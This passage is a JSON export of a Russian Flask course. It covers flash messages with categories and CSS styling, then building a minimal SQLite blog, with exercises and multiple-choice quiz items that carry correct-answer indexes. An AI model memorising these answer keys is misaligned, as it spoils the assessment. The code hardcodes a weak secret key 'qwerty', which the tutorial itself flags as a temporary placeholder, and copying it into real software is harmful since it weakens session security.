сообщения;<o:p></o:p></span></span></p><p class=\"MsoNormal\"><span style=\"color:black;\"><span style=\"mso-themecolor:text1;\">with_categories – разрешает использование категорий при извлечении сообщений;<o:p></o:p></span></span></p><p class=\"MsoNormal\"><span style=\"color:black;\"><span style=\"mso-themecolor:text1;\">category_filter – список разрешенных категорий при выборке сообщений.<o:p></o:p></span></span></p><p class=\"MsoNormal\"><span style=\"color:black;\"><span style=\"mso-themecolor:text1;\">Чтобы воспользоваться функцией flash ее нужно импортировать из модуля flask:</span></span></p><p class=\"MsoNormal\">&nbsp;</p><p class=\"MsoNormal\"><span style=\"color:black;\"><span style=\"mso-themecolor:text1;\"><o:p></o:p></span></span></p><p class=\"MsoNormal\"><span style=\"color:black;\"><span style=\"mso-themecolor:text1;\"><o:p>&nbsp;</o:p></span></span></p><p class=\"MsoNormal\"><span style=\"color:black;\"><span style=\"mso-themecolor:text1;\">5. Добавьте в строку импорта файла </span><span style=\"mso-ansi-language:EN-US;mso-themecolor:text1;\" lang=\"EN-US\">app</span><span style=\"mso-themecolor:text1;\">.</span><span style=\"mso-ansi-language:EN-US;mso-themecolor:text1;\" lang=\"EN-US\">py</span><span style=\"mso-themecolor:text1;\"> импорт </span><span style=\"mso-ansi-language:EN-US;mso-themecolor:text1;\" lang=\"EN-US\">flash</span><span style=\"mso-themecolor:text1;\">:<o:p></o:p></span></span></p><p class=\"a\"><span style=\"color:black;\"><code><span style=\"mso-ansi-language:EN-US;mso-themecolor:text1;\" lang=\"EN-US\">from flask import Flask, render_template, request, flash</span></code></span></p><p class=\"a\">&nbsp;</p><p class=\"a\"><span style=\"color:black;\"><span style=\"mso-ansi-language:EN-US;mso-themecolor:text1;\" lang=\"EN-US\"><o:p></o:p></span></span></p><p class=\"MsoNormal\"><span style=\"color:black;\"><span style=\"mso-ansi-language:EN-US;mso-themecolor:text1;\" lang=\"EN-US\"><o:p>&nbsp;</o:p></span></span></p><p class=\"MsoNormal\"><span style=\"color:black;\"><span style=\"mso-themecolor:text1;\">6. Обработчик маршрута '</span><span style=\"mso-ansi-language:EN-US;mso-themecolor:text1;\" lang=\"EN-US\">contacts</span><span style=\"mso-themecolor:text1;\">' измените так:<o:p></o:p></span></span></p><pre><code class=\"language-python\">@app.route(\"/contacts/\", methods=[\"POST\", \"GET\"])<span style=\"color:black;\"><span style=\"mso-ansi-language:EN-US;mso-themecolor:text1;\" lang=\"EN-US\"><o:p></o:p></span></span>\r\ndef contacts():<span style=\"color:black;\"><span style=\"mso-ansi-language:EN-US;mso-themecolor:text1;\" lang=\"EN-US\"><o:p></o:p></span></span>\r\n &nbsp;if request.method == 'POST':<span style=\"color:black;\"><span style=\"mso-ansi-language:EN-US;mso-themecolor:text1;\" lang=\"EN-US\"><o:p></o:p></span></span>\r\n &nbsp;&nbsp;&nbsp;if len(request.form.get('username')) &gt; 2:<span style=\"color:black;\"><span style=\"mso-ansi-language:EN-US;mso-themecolor:text1;\" lang=\"EN-US\"><o:p></o:p></span></span>\r\n &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;flash('Сообщение отправлено')<span style=\"color:black;\"><span style=\"mso-themecolor:text1;\"><o:p></o:p></span></span>\r\n &nbsp;&nbsp;&nbsp;else:<span style=\"color:black;\"><span style=\"mso-themecolor:text1;\"><o:p></o:p></span></span>\r\n &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;flash('Ошибка отправки')<span style=\"color:black;\"><span style=\"mso-themecolor:text1;\"><o:p></o:p></span></span>\r\n &nbsp;return render_template(\"contacts.html\", title=\"Контакты\")</code></pre><p class=\"a\">&nbsp;</p><p class=\"a\"><span style=\"color:black;\"><span style=\"mso-ansi-language:EN-US;mso-themecolor:text1;\" lang=\"EN-US\"><o:p></o:p></span></span></p><p class=\"MsoNormal\"><span style=\"color:black;\"><span style=\"mso-ansi-language:EN-US;mso-themecolor:text1;\" lang=\"EN-US\"><o:p>&nbsp;</o:p></span></span></p><p class=\"MsoNormal\"><span style=\"color:black;\"><span style=\"mso-themecolor:text1;\">7. Далее, в шаблоне contact</span><span style=\"mso-ansi-language:EN-US;mso-themecolor:text1;\" lang=\"EN-US\">s</span><span style=\"mso-themecolor:text1;\">.html вызовем функцию get_flashed_messages следующим образом :</span><span style=\"mso-spacerun:yes;mso-themecolor:text1;\">&nbsp; </span><span style=\"mso-themecolor:text1;\">(перед кодом формы)<o:p></o:p></span></span></p><pre><code class=\"language-python\">{% for msg in get_flashed_messages() %}<span style=\"color:black;\"><span style=\"mso-ansi-language:EN-US;mso-themecolor:text1;\" lang=\"EN-US\"><o:p></o:p></span></span>\r\n  &lt;div class=\"flash\"&gt;{{msg}}&lt;/div&gt;<span style=\"color:black;\"><span style=\"mso-ansi-language:EN-US;mso-themecolor:text1;\" lang=\"EN-US\"><o:p></o:p></span></span>\r\n{% endfor %}<span style=\"color:black;\"><span style=\"mso-themecolor:text1;\"><o:p></o:p></span></span></code></pre><p class=\"MsoNormal\"><span style=\"color:black;\"><span style=\"line-height:115%;mso-bidi-font-size:13.5pt;mso-themecolor:text1;\">Обратите внимание, функция get_flashed_messages возвращает итератор, содержащий сообщения, то есть, их может быть несколько, если flash в обработчике был вызван несколько раз. Но, в нашем случае, оно будет одно, которое выводится в блоке div.</span></span></p><p class=\"MsoNormal\">&nbsp;</p><p class=\"MsoNormal\"><span style=\"color:black;\"><span style=\"mso-themecolor:text1;\"><o:p></o:p></span></span></p><p class=\"MsoNormal\"><span style=\"color:black;\"><span style=\"mso-themecolor:text1;\"><o:p>&nbsp;</o:p></span></span></p><p class=\"MsoNormal\"><span style=\"color:black;\"><span style=\"mso-themecolor:text1;\">8. Запустите приложение, перейдите в Контакты, наберите произвольный текст и попытайтесь отправить. Вы</span><span style=\"mso-ansi-language:EN-US;mso-themecolor:text1;\"> </span><span style=\"mso-themecolor:text1;\">получите</span><span style=\"mso-ansi-language:EN-US;mso-themecolor:text1;\"> </span><span style=\"mso-themecolor:text1;\">ошибку</span><span style=\"mso-ansi-language:EN-US;mso-themecolor:text1;\" lang=\"EN-US\">:<o:p></o:p></span></span></p><p class=\"MsoNormal\"><span style=\"color:black;font-family:&quot;Calibri&quot;,&quot;sans-serif&quot;;\"><span style=\"mso-ansi-language:EN-US;mso-ascii-theme-font:minor-latin;mso-bidi-theme-font:minor-latin;mso-hansi-theme-font:minor-latin;mso-themecolor:text1;\" lang=\"EN-US\">RuntimeError: The session is unavailable because no secret key was set. Set the secret_key on the application to something unique and secret<o:p></o:p></span></span></p><p class=\"MsoNormal\"><span style=\"color:black;\"><span style=\"mso-themecolor:text1;\">Переведите её.<o:p></o:p></span></span></p><p class=\"MsoNormal\"><span style=\"color:black;\"><span style=\"mso-themecolor:text1;\"><o:p>&nbsp;</o:p></span></span></p><p class=\"MsoNormal\"><span style=\"color:black;\"><span style=\"mso-themecolor:text1;\">Дело в том, что функции flash и get_flashed_messages используют механизм сессий, чтобы отображать сообщения только один раз и при обновлении страницы более его не показывать. Чтобы активизировать работу сессий, необходимо в конфигурацию программы прописать секретный ключ.</span></span></p><p class=\"MsoNormal\">&nbsp;</p><p class=\"MsoNormal\"><span style=\"color:black;\"><span style=\"mso-themecolor:text1;\"><o:p></o:p></span></span></p><p class=\"MsoNormal\"><span style=\"color:black;\"><span style=\"mso-themecolor:text1;\">9. Добавьте в файл app.py после инициализации приложения Flask<o:p></o:p></span></span></p><p class=\"MsoNormal\"><span style=\"color:black;\"><span style=\"mso-themecolor:text1;\">(после строки app = Flask(__name__) )<o:p></o:p></span></span></p><p class=\"MsoNormal\"><span style=\"color:black;\"><span style=\"mso-themecolor:text1;\">следующую строку:<o:p></o:p></span></span></p><p class=\"a\"><span style=\"color:black;\"><code><span style=\"line-height:115%;mso-bidi-font-size:13.5pt;mso-themecolor:text1;\">app.config['SECRET_KEY'] = 'qwerty'</span></code><span style=\"mso-themecolor:text1;\"><o:p></o:p></span></span></p><p class=\"MsoNormal\">Это не самый лучший ключ, в смысле секретности, позже мы еще об этом поговорим, а пока пусть он будет записан в таком виде.</p><p class=\"MsoNormal\">&nbsp;</p><p class=\"MsoNormal\"><span style=\"color:black;font-family:&quot;Yandex Sans Display Light&quot;,&quot;serif&quot;;font-size:13.5pt;\"><span style=\"line-height:115%;mso-themecolor:text1;\"><o:p></o:p></span></span></p><p class=\"MsoNormal\"><span style=\"color:black;font-family:&quot;Yandex Sans Display Light&quot;,&quot;serif&quot;;font-size:13.5pt;\"><span style=\"line-height:115%;mso-themecolor:text1;\"><o:p>&nbsp;</o:p></span></span></p><p class=\"MsoNormal\"><span style=\"color:black;\"><span style=\"mso-themecolor:text1;\">10. Снова введите текст в поле 'Имя' формы и отправьте.<o:p></o:p></span></span></p><p class=\"MsoNormal\"><span style=\"color:black;\"><span style=\"mso-themecolor:text1;\">Если вы ввели более 2 символов вы должны увидеть \"Сообщение отправлено\" или \" Ошибка отправки\" в ином случае.<o:p></o:p></span></span></p><p class=\"MsoNormal\"><span style=\"color:black;\"><span style=\"mso-themecolor:text1;\"><o:p>&nbsp;</o:p></span></span></p><p class=\"MsoNormal\"><span style=\"color:black;\"><span style=\"mso-themecolor:text1;\">Далее, добавим </span><span style=\"mso-ansi-language:EN-US;mso-themecolor:text1;\" lang=\"EN-US\">css</span><span style=\"mso-themecolor:text1;\">-оформление этому сообщению, причем разное для разных типов: успешных и ошибочных.</span></span></p><p class=\"MsoNormal\">&nbsp;</p><p class=\"MsoNormal\"><span style=\"color:black;\"><span style=\"mso-themecolor:text1;\"><o:p></o:p></span></span></p><p class=\"MsoNormal\"><span style=\"color:black;\"><span style=\"mso-themecolor:text1;\"><o:p>&nbsp;</o:p></span></span></p><p class=\"MsoNormal\"><span style=\"color:black;\"><span style=\"mso-themecolor:text1;\">11. В файле стилей нашего приложения </span><span style=\"mso-ansi-language:EN-US;mso-themecolor:text1;\" lang=\"EN-US\">style</span><span style=\"mso-themecolor:text1;\">.</span><span style=\"mso-ansi-language:EN-US;mso-themecolor:text1;\" lang=\"EN-US\">css</span><span style=\"mso-themecolor:text1;\"> (помните, он находится в папке '</span><span style=\"mso-ansi-language:EN-US;mso-themecolor:text1;\" lang=\"EN-US\">static</span><span style=\"mso-themecolor:text1;\">' и предполагается, что он подключен в базовом шаблоне) напишите следующее:<o:p></o:p></span></span></p><pre><code class=\"language-css\">.flash {padding: 10px;}<span style=\"color:black;\"><span style=\"mso-ansi-language:EN-US;mso-themecolor:text1;\" lang=\"EN-US\"><o:p></o:p></span></span>\r\n.flash.success {<span style=\"color:black;\"><span style=\"mso-ansi-language:EN-US;mso-themecolor:text1;\" lang=\"EN-US\"><o:p></o:p></span></span>\r\n &nbsp;border: 1px solid #21DB56;<span style=\"color:black;\"><span style=\"mso-ansi-language:EN-US;mso-themecolor:text1;\" lang=\"EN-US\"><o:p></o:p></span></span>\r\n &nbsp;background: #AEFFC5;<span style=\"color:black;\"><span style=\"mso-ansi-language:EN-US;mso-themecolor:text1;\" lang=\"EN-US\"><o:p></o:p></span></span>\r\n}<span style=\"color:black;\"><span style=\"mso-ansi-language:EN-US;mso-themecolor:text1;\" lang=\"EN-US\"><o:p></o:p></span></span>\r\n.flash.error {<span style=\"color:black;\"><span style=\"mso-ansi-language:EN-US;mso-themecolor:text1;\" lang=\"EN-US\"><o:p></o:p></span></span>\r\n &nbsp;border: 1px solid #FF4343;<span style=\"color:black;\"><span style=\"mso-ansi-language:EN-US;mso-themecolor:text1;\" lang=\"EN-US\"><o:p></o:p></span></span>\r\n &nbsp;background: #FF9C9C;<span style=\"color:black;\"><span style=\"mso-ansi-language:EN-US;mso-themecolor:text1;\" lang=\"EN-US\"><o:p></o:p></span></span>\r\n}</code></pre><p class=\"a\">&nbsp;</p><p class=\"a\"><span style=\"color:black;\"><span style=\"mso-themecolor:text1;\"><o:p></o:p></span></span></p><p class=\"MsoNormal\"><span style=\"color:black;\"><span style=\"mso-themecolor:text1;\"><o:p>&nbsp;</o:p></span></span></p><p class=\"MsoNormal\"><span style=\"color:black;\"><span style=\"mso-themecolor:text1;\">12. В файле </span><span style=\"mso-ansi-language:EN-US;mso-themecolor:text1;\" lang=\"EN-US\">app</span><span style=\"mso-themecolor:text1;\">.</span><span style=\"mso-ansi-language:EN-US;mso-themecolor:text1;\" lang=\"EN-US\">py</span><span style=\"mso-themecolor:text1;\">, в обработчике маршрута '</span><span style=\"mso-ansi-language:EN-US;mso-themecolor:text1;\" lang=\"EN-US\">contacts</span><span style=\"mso-themecolor:text1;\">' для функции </span><span style=\"mso-ansi-language:EN-US;mso-themecolor:text1;\" lang=\"EN-US\">flash</span><span style=\"mso-themecolor:text1;\">() добавьте указание категории сообщения:<o:p></o:p></span></span></p><pre><code class=\"language-python\"> &nbsp;if request.method == 'POST':<span style=\"color:black;\"><span style=\"mso-ansi-language:EN-US;mso-themecolor:text1;\" lang=\"EN-US\"><o:p></o:p></span></span>\r\n &nbsp;&nbsp;&nbsp;if len(request.form['username']) &gt; 2:<span style=\"color:black;\"><span style=\"mso-ansi-language:EN-US;mso-themecolor:text1;\" lang=\"EN-US\"><o:p></o:p></span></span>\r\n &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;flash('Сообщение отправлено', category='success')<span style=\"color:black;\"><span style=\"mso-ansi-language:EN-US;mso-themecolor:text1;\" lang=\"EN-US\"><o:p></o:p></span></span>\r\n &nbsp;&nbsp;&nbsp;else:<span style=\"color:black;\"><span style=\"mso-ansi-language:EN-US;mso-themecolor:text1;\" lang=\"EN-US\"><o:p></o:p></span></span>\r\n &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;flash('Ошибка отправки', category='error')</code></pre><p class=\"a\">&nbsp;</p><p class=\"a\"><span style=\"color:black;\"><span style=\"mso-ansi-language:EN-US;mso-themecolor:text1;\" lang=\"EN-US\"><o:p></o:p></span></span></p><p class=\"MsoNormal\"><span style=\"color:black;\"><span style=\"mso-ansi-language:EN-US;mso-themecolor:text1;\" lang=\"EN-US\"><o:p>&nbsp;</o:p></span></span></p><p class=\"MsoNormal\"><span style=\"color:black;\"><span style=\"mso-ansi-language:EN-US;mso-themecolor:text1;\" lang=\"EN-US\">13. </span><span style=\"mso-themecolor:text1;\">В</span><span style=\"mso-ansi-language:EN-US;mso-themecolor:text1;\"> </span><span style=\"mso-themecolor:text1;\">шаблоне</span><span style=\"mso-ansi-language:EN-US;mso-themecolor:text1;\"> </span><span style=\"mso-themecolor:text1;\">страницы</span><span style=\"mso-ansi-language:EN-US;mso-themecolor:text1;\" lang=\"EN-US\"> 'contacts.html' </span><span style=\"mso-themecolor:text1;\">измените</span><span style=\"mso-ansi-language:EN-US;mso-themecolor:text1;\"> </span><span style=\"mso-themecolor:text1;\">обработчик</span><span style=\"mso-ansi-language:EN-US;mso-themecolor:text1;\" lang=\"EN-US\"> get_flashed_messages() :<o:p></o:p></span></span></p><pre><code class=\"language-python\">{% for cat, msg in get_flashed_messages(True) %}<span style=\"color:black;\"><span style=\"mso-ansi-language:EN-US;mso-themecolor:text1;\" lang=\"EN-US\"><o:p></o:p></span></span>\r\n  &lt;div class=\"flash {{cat}}\"&gt;{{msg}}&lt;/div&gt;<span style=\"color:black;\"><span style=\"mso-ansi-language:EN-US;mso-themecolor:text1;\" lang=\"EN-US\"><o:p></o:p></span></span>\r\n{% endfor %}<span style=\"color:black;\"><span style=\"mso-themecolor:text1;\"><o:p></o:p></span></span></code></pre><p class=\"MsoNormal\"><span style=\"color:black;\"><span style=\"mso-themecolor:text1;\"><o:p>&nbsp;</o:p></span></span></p><p class=\"MsoNormal\"><span style=\"color:black;\"><span style=\"mso-themecolor:text1;\">Здесь параметр True в функции get_flashed_messages разрешает оперировать категориями мгновенных сообщений. Все, теперь при успешной отправке увидим сообщение на зеленом фоне, а при ошибке – на красном.<o:p></o:p></span></span></p><p class=\"MsoNormal\"><span style=\"color:black;\"><span style=\"mso-themecolor:text1;\"><o:p>&nbsp;</o:p></span></span></p><p class=\"MsoNormal\">&nbsp;</p><p class=\"MsoNormal\"><span style=\"color:black;\"><span style=\"mso-themecolor:text1;\"><o:p></o:p></span></span></p><p class=\"MsoNormal\"><span style=\"color:black;\"><span style=\"mso-themecolor:text1;\"><o:p></o:p></span></span></p><p class=\"MsoNormal\"><span style=\"color:black;\"><span style=\"mso-themecolor:text1;\"><o:p>&nbsp;</o:p></span></span></p>"
            },
            "is_published": true
        },
        {
            "id": 15,
            "section_id": 2,
            "number": 2,
            "name": "Создание базы данных и минимальной версии приложения блог",
            "slug": "db-and-min-app",
            "content": {
                "tasks": [
                    {
                        "id": 1,
                        "content": "<p>Добавьте в таблицу posts новое поле author (TEXT NOT NULL).<br>Обновите файл schema.sql, пересоздайте базу данных и измените init_db.py, чтобы каждый тестовый пост имел автора.<br>Выведите имя автора рядом с заголовком поста на главной странице.</p>"
                    },
                    {
                        "id": 2,
                        "content": "<p>Реализуйте сортировку постов на главной странице по дате создания:</p><p>от новых к старым</p><p>по параметру URL ?order=asc|desc</p><p>затем (дополнительно) от старых к новым.</p>"
                    },
                    {
                        "id": 3,
                        "content": "<p>Добавьте ограничение длины заголовка поста на уровне базы данных (например, не более 100 символов).<br>Проверьте, что при попытке вставки более длинного заголовка возникает ошибка.</p>"
                    },
                    {
                        "id": 4,
                        "content": "<p>Создайте страницу /latest, на которой отображаются только 5 последних постов блога.<br>Используйте SQL-запрос с ORDER BY и LIMIT.</p>"
                    },
                    {
                        "id": 5,
                        "content": "<p>Добавьте отображение краткого содержания поста на главной странице:</p><p>выводите только первые 100 символов поля content;</p><p>добавляйте ..., если текст был обрезан.</p>"
                    },
                    {
                        "id": 6,
                        "content": "<p>Реализуйте страницу /search, на которой можно искать посты по слову в заголовке или содержимом.<br>Поиск должен выполняться через SQL (LIKE), а результаты отображаться списком заголовков с ссылками.</p>"
                    },
                    {
                        "id": 7,
                        "content": "<p>Добавьте страницу /stats, на которой отображается:</p><p>общее количество постов;</p><p>дата самого первого поста;</p><p>дата самого последнего поста.<br>Все данные должны получаться одним или несколькими SQL-запросами.</p>"
                    },
                    {
                        "id": 8,
                        "content": "<p>Реализуйте собственную страницу ошибки 404 (шаблон 404.html), которая будет отображаться при обращении к несуществующему посту, вместо стандартной страницы Flask.</p>"
                    }
                ],
                "tests": [
                    {
                        "id": 1,
                        "options": [
                            "Для выполнения одного параметризованного SQL-запроса",
                            "Для чтения данных из базы SQLite",
                            "Для создания курсора базы данных",
                            "Для выполнения сразу нескольких SQL-команд из файла схемы "
                        ],
                        "question": "Для чего в коде используется метод executescript()?",
                        "correct_index": 3
                    },
                    {
                        "id": 2,
                        "options": [
                            "Для ускорения выполнения SQL-запросов",
                            "Потому что SQLite не поддерживает f-строки",
                            "Для автоматического преобразования типов данных",
                            "Для защиты от SQL-инъекций и безопасной подстановки значений "
                        ],
                        "question": "Почему в запросах SQLite используются плейсхолдеры \"?\" ?",
                        "correct_index": 3
                    },
                    {
                        "id": 3,
                        "options": [
                            "Чтобы ускорить работу базы данных",
                            "Чтобы автоматически сериализовать данные в JSON",
                            "Чтобы получать строки результата в виде словарей с доступом по имени столбца ",
                            "Чтобы включить фабрику создания строк"
                        ],
                        "question": "Зачем объекту подключения SQLite задаётся row_factory = sqlite3.Row?",
                        "correct_index": 2
                    },
                    {
                        "id": 4,
                        "options": [
                            "Завершить работу сервера Flask с отображением ошибки 404",
                            "Удалить пост с идентификатором 404",
                            "Вернуть страницу с ошибкой, если пост с указанным ID не найден ",
                            "Перенаправить пользователя на главную страницу"
                        ],
                        "question": "Какое назначение функции abort(404) в маршруте просмотра поста?",
                        "correct_index": 2
                    },
                    {
                        "id": 5,
                        "options": [
                            "Для выполнения SQL-запроса по идентификатору поста",
                            "Для генерации корректной ссылки на страницу просмотра конкретного поста ",
                            "Для передачи данных поста из шаблона в базу данных",
                            "Для сортировки постов по идентификатору"
                        ],
                        "question": "Для чего используется функция url_for('post', post_id=post['id']) в шаблоне index.html?",
                        "correct_index": 1
                    }
                ],
                "theory_html": "<h4><span style=\"background-color:white;\">Создание и настройка базы данных</span></h4><p><span style=\"background-color:white;\">Создадим базу данных, в которой будут храниться посты блога, и добавьте в нее несколько примеров постов.</span></p><p><span style=\"background-color:white;\">Будем использовать СУБД SQLite, поскольку необходимый для взаимодействия с БД модуль sqlite3 уже входит в состав Python.</span></p><p><span style=\"background-color:white;\">Важно понимать, что </span>SQLite подходит для учебных проектов и небольших приложений, но не предназначена для высоконагруженных многопользовательских систем.</p><p><span style=\"background-color:white;\">&nbsp;</span></p><p><span style=\"background-color:white;\">1. В директории проекта создайте файл schema.sql, содержащий набор SQL-команд для создания базы данных, состоящей из таблицы posts (где будут хранится будущие посты) с несколькими столбцами.</span></p><p><span style=\"background-color:white;\">Добавьте в файл следующий код:</span></p><pre><code class=\"language-python\">DROP TABLE IF EXISTS posts;\r\nCREATE TABLE posts (\r\n &nbsp;&nbsp; id INTEGER PRIMARY KEY,\r\n &nbsp;&nbsp; created TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP,\r\n &nbsp;&nbsp; title TEXT NOT NULL,\r\n &nbsp;&nbsp; content TEXT NOT NULL\r\n);</code></pre><p><span style=\"background-color:white;\">В этом коде:</span></p><p><span style=\"background-color:white;\">Команда DROP TABLE IF EXISTS posts; удаляет таблицу posts, если она уже существует. Этот шаг рекомендуется выполнять перед созданием любой новой таблицы, так как он позволяет исключить возможные ошибки.</span></p><p><span style=\"background-color:white;\">Команда CREATE TABLE posts создает таблицу posts со следующими столбцами:</span></p><p><span style=\"background-color:white;\">id — целое число, первичный ключ (PRIMARY KEY) таблицы, значением будет уникальное число, сгенерированное автоматически при вставке новой записи (поста блога) в таблицу.</span></p><p><span style=\"background-color:white;\">created — время создания новой записи. NOT NULL означает, что значение в столбце не может быть пустым, а DEFAULT CURRENT_TIMESTAMP​​​ — что значением по умолчанию будет момент добавления новой записи в таблицу, т.е. текущее время на компьютере сервера. Это позволит не указывать вручную время создания поста, оно будет подставляться автоматически.</span></p><p><span style=\"background-color:white;\">title — заголовок поста.</span></p><p><span style=\"background-color:white;\">content — основной текст поста.</span></p><p><span style=\"background-color:white;\">Сохраните и закройте файл schema.sql.</span></p><p><span style=\"background-color:white;\">&nbsp;</span></p><p><span style=\"background-color:white;\">2. Создайте и откройте файл init_db.py в директории проекта flask_blog.</span></p><p><span style=\"background-color:white;\">Этот файл позволит сформировать файл базы данных SQLite, и подключить его к web-приложению, а также вставить начальные посты - примеры.</span></p><p><span style=\"background-color:white;\">Добавьте в файл следующий код:</span></p><pre><code class=\"language-python\">import sqlite3\r\nconnection = sqlite3.connect('database.db')\r\nwith open('schema.sql') as f:\r\n    connection.executescript(f.read())\r\ncur = connection.cursor()\r\ncur.execute(\"INSERT INTO posts (title, content) VALUES (?, ?)\", \r\n            ('Первый пост', 'Содержимое первого поста') )\r\ncur.execute(\"INSERT INTO posts (title, content) VALUES (?, ?)\", \r\n            ('Второй пост', 'Содержимое второго поста') )\r\nconnection.commit()\r\nconnection.close()</code></pre><p><span style=\"background-color:white;\">В этом коде:</span></p><p><span style=\"background-color:white;\">Импортируется модуль sqlite3.</span></p><p><span style=\"background-color:white;\">Открывается соединение с файлом базы данных database.db, который будет создан сразу после запуска единичного запуска этого python-файла.</span></p><p><span style=\"background-color:white;\">С помощью функции open() открывается созданная ранее SQL-схема schema.sql.</span></p><p><span style=\"background-color:white;\">С помощью метода executescript() выполняется несколько операторов SQL и формируется таблица posts.</span></p><p><span style=\"background-color:white;\">С помощью метода cursor() открывается курсор, необходимый для отправки запросов к базе данных.</span></p><p><span style=\"background-color:white;\">С помощью метода execute() выполняются два оператора SQL INSERT, которые добавляют два поста-примера в таблицу posts. (insert - вставка)</span></p><p><span style=\"background-color:white;\">Изменения фиксируются, и соединение закрывается.</span></p><p><span style=\"background-color:white;\">&nbsp;</span></p><p><span style=\"background-color:white;\">3. Сохраните файл init_db.py и запустите его на выполнение обычным способом.</span></p><p><span style=\"background-color:white;\">(Если у вас в терминале запущен сервер (выполняется приложение), необходимо закрыть его. Ещё лучше закрыть и снова открыть терминал)</span></p><p><span style=\"background-color:white;\">Примечание. Вы также можете запустить python файл на выполнение прямой командой в терминале:</span></p><p><span style=\"background-color:white;\">python init_db.py</span></p><p><span style=\"background-color:white;\">&nbsp;</span></p><p><span style=\"background-color:white;\">Убедитесь, что в директории проекта </span><span style=\"background-color:white;font-family:&quot;Cambria&quot;,&quot;serif&quot;;\">flask_blog</span><span style=\"background-color:white;\"> появился файл </span><span style=\"background-color:white;font-family:&quot;Cambria&quot;,&quot;serif&quot;;\">database.db</span><span style=\"background-color:white;\">.</span></p><p><span style=\"background-color:white;\">Открывать этот файл не надо, т.к. в нём содержатся все данные базы данных в бинарном виде.</span></p><p><span style=\"background-color:white;\">&nbsp;</span></p><h4><span style=\"background-color:white;\">Создание функционала отображения постов блога</span></h4><p><span style=\"background-color:white;\">На главной странице приложения настройте отображение полного списка постов блога и создайте страницу просмотра содержимого отдельных постов по их идентификатору (ID).</span></p><p><span style=\"background-color:white;\">&nbsp;</span></p><p><span style=\"background-color:white;\">1. Измените функцию визуализации </span><span style=\"background-color:white;font-family:&quot;Cambria&quot;,&quot;serif&quot;;\">index()</span><span style=\"background-color:white;\"> и шаблон </span><span style=\"background-color:white;font-family:&quot;Cambria&quot;,&quot;serif&quot;;\">index.html</span><span style=\"background-color:white;\">, чтобы отобразить список всех постов, сохраненных в базе данных.</span></p><p><span style=\"background-color:white;\">Откройте файл app.py и замените его код (целиком) на следующий:</span></p><pre><code class=\"language-python\">import sqlite3\r\nfrom flask import Flask, render_template\r\n \r\ndef get_db_connection():\r\n &nbsp; conn = sqlite3.connect('database.db')\r\n &nbsp; conn.row_factory = sqlite3.Row\r\n &nbsp; return conn\r\n \r\napp = Flask(__name__)\r\n \r\n@app.route('/')\r\ndef index():\r\n &nbsp; conn = get_db_connection()\r\n &nbsp; posts = conn.execute('SELECT * FROM posts').fetchall()\r\n &nbsp; conn.close()\r\n &nbsp; return render_template('index.html', posts=posts)\r\n \r\nif __name__ == '__main__':\r\n &nbsp; app.run(debug=True)</code></pre><p><span style=\"background-color:white;\">Объяснение:</span></p><p><span style=\"background-color:white;\">Импортируется модуль sqlite3.</span></p><p><span style=\"background-color:white;\">Создается функция get_db_connection(), в которой:</span></p><p><span style=\"background-color:white;\">- создается объект подключения conn к базе данных database.db;</span></p><p><span style=\"background-color:white;\">- данные БД присваиваются атрибуту row_factory объекта conn;</span></p><p><span style=\"background-color:white;font-size:13.0pt;\">- возвращается объект подключения conn, который будет использоваться для доступа к БД.</span></p><p><span style=\"background-color:white;\">В измененной функции index():</span></p><p><span style=\"background-color:white;\">- объекту conn присваивается объект подключения к БД, возвращенный функцией get_db_connection();</span></p><p><span style=\"background-color:white;\">- с помощью метода fetchall() объекту posts присваивается результат выполнения SQL-запроса для выбора всех записей из таблицы posts;</span></p><p><span style=\"background-color:white;\">- с помощью метода close() закрывается подключение к базе данных;</span></p><p><span style=\"background-color:white;\">- возвращается HTML-код главной страницы приложения, сформированный из шаблона index.html, в который в качестве аргумента передается объект posts, содержащий все записи таблицы с постами.</span></p><p><span style=\"background-color:white;\">Сохраните и закройте файл app.py.</span></p><p><span style=\"background-color:white;\">&nbsp;</span></p><p><span style=\"background-color:white;\">2. Откройте шаблон главной страницы приложения index.html:</span></p><p><span style=\"background-color:white;\">Замените содержимое файла следующим кодом:</span></p><pre><code class=\"language-jinja2\">{% extends 'base.html' %}\r\n \r\n{% block content %}\r\n  &lt;h1&gt;{% block title %} Добро пожаловать в FlaskBlog {% endblock %}&lt;/h1&gt;\r\n  {% for post in posts %}\r\n &nbsp;&nbsp; &lt;a href=\"#\"&gt;\r\n &nbsp;&nbsp;&nbsp;&nbsp; &lt;h2&gt;{{ post['title'] }}&lt;/h2&gt;\r\n &nbsp;&nbsp; &lt;/a&gt;\r\n &nbsp;&nbsp; &lt;span class=\"badge text-bg-primary\"&gt;{{ post['created'] }}&lt;/span&gt;\r\n &nbsp;&nbsp; &lt;hr&gt;\r\n  {% endfor %}\r\n{% endblock %}</code></pre><p><span style=\"background-color:white;\">В этом коде добавляются:</span></p><p><span style=\"background-color:white;font-family:&quot;Courier New&quot;;\">{% for post in posts %} ... {% endfor %}</span><span style=\"background-color:white;\"> — цикл Jinja, который отображает по порядку каждый элемент, содержащийся в объекте posts, переданном функцией index() в файле app.py. Внутри этого цикла для каждого поста в HTML-заголовке &lt;h2&gt;​​ отображается заголовок поста ​со ссылкой. В дальнейшем эти ссылки будут использоваться для перехода на страницы просмотра отдельных постов.</span></p><p><span style=\"background-color:white;font-family:&quot;Courier New&quot;;\">{{ post['title'] }}</span><span style=\"background-color:white;\"> — значение заголовка поста, который содержится в переменной post, то есть в элементе объекта posts, обрабатываемом в текущей итерации цикла for.</span></p><p><span style=\"background-color:white;\">Аналогично отображается дата создания поста </span><span style=\"background-color:white;font-family:&quot;Courier New&quot;;\">post['created']</span><span style=\"background-color:white;\">, к дате применяется CSS-класс badge описанный в css-фреймворке Bootstrap.</span></p><p><span style=\"background-color:white;\">Сохраните и закройте файл index.html.</span></p><p><span style=\"background-color:white;\">&nbsp;</span></p><p><span style=\"background-color:white;\">3. Запустите приложение запустив файл app.py.</span></p><p><span style=\"background-color:white;\">Вы увидите список заголовков двух постов, которые вы добавили в базу данных при ее создании.</span></p><p><span style=\"background-color:white;\">&nbsp;</span></p><h4><span style=\"background-color:white;\">Отобразите отдельные посты блога</span></h4><p><span style=\"background-color:white;\">Создайте новый маршрут Flask с функцией визуализации, которая будет обрабатывать новый HTML-шаблон для отображения отдельного поста блога по его идентификатору. С помощью нового маршрута приложение по URL </span><span style=\"background-color:white;font-family:&quot;Courier 